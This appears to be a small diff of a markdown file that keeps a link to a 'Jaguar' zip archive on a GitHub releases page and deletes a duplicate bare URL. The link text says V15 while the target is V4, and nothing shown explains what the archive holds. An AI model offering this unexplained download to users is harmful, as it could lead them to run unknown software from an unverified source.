@@ -11,7 +11,7 @@
 
 [Jaguar.2.0.7.3_V15.zip](https://github.com/idpx7q8/NSWJaops/releases/download/Visions/Jaguar.2.0.7.3_V4.zip)
 
-https://github.com/idpx7q8/NSWJaops/releases/download/Visions/Jaguar.2.0.7.3_V4.zip
+
 
 
 
